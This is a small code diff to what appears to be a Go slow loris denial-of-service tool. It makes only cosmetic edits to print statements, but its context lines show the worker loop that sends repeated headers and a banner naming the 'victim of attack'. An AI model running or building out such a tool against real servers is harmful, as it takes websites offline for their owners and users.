@@ -140,7 +140,7 @@ func loris(worker *attacker, doneChan chan int, delay int, header string) {
     if err := writeEndpoint(worker.conn, repeatHeader); err != nil {
       fmt.Println("error with repeat header")
     } else {
-      fmt.Println("loris sent by attacker", worker.id, worker.attacks, "for this worker", total, "total")
+      fmt.Println("loris sent by attacker", worker.id, worker.attacks, "for this worker", total, "total"  )
     }
   }
   doneChan <- 1
@@ -149,7 +149,7 @@ func loris(worker *attacker, doneChan chan int, delay int, header string) {
 // utility function, prints details about attack
 func announceAttack(attackState *state) {
   fmt.Println("==========================================")
-  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER version 0.1")
+  fmt.Println("AASHRAY'S SLOW LORIS ATTACKER Version 0.1")
   fmt.Println("        VICTIM OF ATTACK:", attackState.endpoint)
   fmt.Println("        NUMBER OF ATTACKERS:", attackState.numAttackers)
   fmt.Println("        DELAY BETWEEN EACH WRITE:", attackState.delay)
